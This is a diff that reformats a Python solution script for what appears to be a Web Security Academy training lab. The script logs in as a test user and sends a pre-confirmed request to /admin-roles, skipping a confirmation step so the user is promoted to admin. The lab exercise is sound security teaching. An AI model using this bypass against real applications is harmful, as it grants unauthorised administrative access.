@@ -20,35 +20,45 @@ from colorama import Fore
 # change this to your lab URL
 url = "https://0a2e009703e633a78243512f006800f2.web-security-academy.net"
 
-
-try:  # login as wiener
+try:  
+    # set credentials
     data = {
         "username": "wiener",
         "password": "peter"
     }
+    
+    # login as wiener
     login = requests.post(f"{url}/login", data, allow_redirects=False)
+    
     if login.status_code == 302:
-        print(
-            Fore.WHITE + "1. Logging in as wiener.. " + Fore.GREEN + "OK")
+        print(Fore.WHITE + "1. Logging in as wiener.. " + Fore.GREEN + "OK")
+
+        # get session cookie
         session = login.cookies.get("session")
-        try:  # upgrade wiener to be an admin bypassing the first step
+        
+        try:  
+            # set session cookie
             cookies = {"session": session}
+            
+            # set credentials
             data = {
                 "username": "wiener",
                 "action": "upgrade",
                 "confirmed": "true"
             }
-            upgrade_wiener = requests.post(
-                f"{url}/admin-roles", data, cookies=cookies)
-            print(
-                Fore.WHITE + "2. Upgrading wiener to be an admin bypassing the first step.. " + Fore.GREEN + "OK")
-            print(
-                Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
+            
+            # upgrade wiener to be an admin bypassing the first step
+            upgrade_wiener = requests.post(f"{url}/admin-roles", data, cookies=cookies)
+            
+            print(Fore.WHITE + "2. Upgrading wiener to be an admin bypassing the first step.. " + Fore.GREEN + "OK")
+            
+            print(Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
+        
         except:
-            print(
-                Fore.RED + "[!] Failed to upgrade wiener to be an admin through exception")
+            print(Fore.RED + "[!] Failed to upgrade wiener to be an admin through exception")
+
     else:
         print(Fore.RED + "[!] Failed to login as wiener")
+
 except:
-    print(
-        Fore.RED + "[!] Failed to login as wiener through exception")
+    print(Fore.RED + "[!] Failed to login as wiener through exception")
